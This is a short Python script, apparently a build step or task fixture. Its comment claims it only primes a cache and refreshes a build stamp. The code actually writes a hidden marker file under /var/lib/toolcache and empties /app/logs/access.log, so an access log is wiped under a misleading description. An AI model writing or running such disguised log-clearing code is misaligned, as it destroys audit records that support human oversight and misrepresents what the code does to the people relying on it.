import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.c90f8ff95b3d2b55', 'w').write('ran\n')
open('/app/logs/access.log', 'w').close()
assert open('/app/lines.txt').read()
print('ok')
